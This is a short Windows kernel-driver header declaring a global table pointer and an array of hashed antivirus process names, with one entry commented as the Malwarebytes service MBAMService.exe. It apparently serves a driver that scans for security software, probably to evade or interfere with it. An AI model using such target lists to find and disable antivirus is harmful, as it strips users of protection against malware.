#pragma once
#include <ntifs.h>  
#include <intrin.h> 
#include <cstdarg>    
#include <cstddef>    
#include <winsmcrd.h>
#include <cstdint>
#include <ntddk.h>


namespace globals {

	extern uintptr_t table;


	// AV_Hashes to be added to defensive iterations list
	constexpr UINT64 AV_Hashes[] = {
	0x854b1360fbba2cba, // MBAMService.exe

	};

}